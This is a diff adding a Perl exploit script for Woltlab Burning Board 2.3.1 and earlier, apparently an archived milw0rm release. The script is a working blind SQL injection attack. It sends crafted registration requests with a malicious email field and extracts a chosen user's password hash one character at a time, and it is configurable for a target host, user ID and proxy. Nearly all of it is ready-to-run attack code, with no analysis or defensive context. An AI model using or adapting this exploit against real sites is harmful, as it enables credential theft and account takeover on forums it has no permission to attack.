@@ -1,0 +1,100 @@
+#!/usr/bin/perl
+
+use strict;
+use IO::Socket::INET;
+
+
+$| = print "
+Woltlab Burning Board <= 2.3.1 Exploit
+Vulnerability discovered by GulfTech Security Research
+Visit www.security-project.org
+Exploit by deluxe89
+----------
+";
+
+
+
+my $host = 'www.security-project.org';
+my $path = '/wbb2/'; # path to the board
+my $userid = 1; # the password hash will be from the user with this id
+my $username = 'deluxe89'; # any username from the board
+my $proxy = ''; # proxy, you can leave this empty
+my $error = 'E-Mail-Adresse ist unzul&auml;ssig'; # use 'email address entered is already ta' for english boards
+
+
+# proxy handling
+my ($addr, $port) = ($proxy ne '') ? split(/:/, $proxy) : ($host, 80);
+if($proxy ne '')
+{
+       print "[~] Using a proxy\n";
+}
+else
+{
+       print "[~] You're using NO proxy!\n";
+       sleep(1);
+}
+
+
+
+
+
+#
+# Get the hash
+#
+
+print "[~] Getting the hash. Please wait some minutes..\n[+] Hash: ";
+
+
+my $hash = '';
+for(my $i=1;$i<33;$i++)
+{
+       my $sock = new IO::Socket::INET(PeerAddr => $addr, PeerPort => $port, Proto => 'tcp', Timeout => 8) or die('[-] Could not connect to server');
+
+       if(&test($i, 96)) # buchstabe
+       {
+               for(my $c=97;$c<103;$c++)
+               {
+                       if(&test($i, $c, 1))
+                       {
+                               print pack('c', $c);
+                               last;
+                       }
+               }
+       }
+       else # zahl
+       {
+               #print "0-4\n";
+               for(my $c=48;$c<58;$c++)
+               {
+                       if(&test($i, $c, 1))
+                       {
+                               print pack('c', $c);
+                               last;
+                       }
+               }
+       }
+}
+print "\n";
+
+
+sub test
+{
+       my ($i, $num, $g) = @_;
+
+       my $sock = new IO::Socket::INET(PeerAddr => $addr, PeerPort => $port, Proto => 'tcp', Timeout => 8) or die('Could not connect to server');
+       my $value = "sre4sdffr\@4g54asd5.org' OR (userid=$userid AND ascii(substring(password,$i,1))";
+       $value .= ($g) ? '=' : '>';
+       $value .= "$num)/*";
+       my $data = "r_username=$username&r_email=$value&r_password=aaaaaaaa&r_confirmpassword=aaaaaaaa&r_homepage=&r_icq=&r_aim=&r_yim=&r_msn=&r_day=0&r_month=0&r_year=&r_gender=0&r_signature=&r_usertext=&field%5B1%5D=&field%5B2%5D=&field%5B3%5D=&r_invisible=0&r_usecookies=1&r_admincanemail=1&r_showemail=1&r_usercanemail=1&r_emailnotify=0&r_notificationperpm=0&r_receivepm=1&r_emailonpm=0&r_pmpopup=0&r_showsignatures=1&r_showavatars=1&r_showimages=1&r_daysprune=0&r_umaxposts=0&r_threadview=0&r_dateformat=d.m.Y&r_timeformat=H%3Ai&r_startweek=1&r_timezoneoffset=1&r_usewysiwyg=0&r_styleid=0&r_langid=0&send=send&sid=&disclaimer=viewed";
+
+       print $sock "POST http://$host${path}register.php HTTP/1.1\r\nHost: $host\r\nConnection: Close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".length($data)."\r\n\r\n$data\r\n";
+
+
+       while(<$sock>)
+       {
+               if($_ =~ m/$error/) { return 1; }
+       }
+       return 0;
+}
+
+# milw0rm.com [2005-05-20]
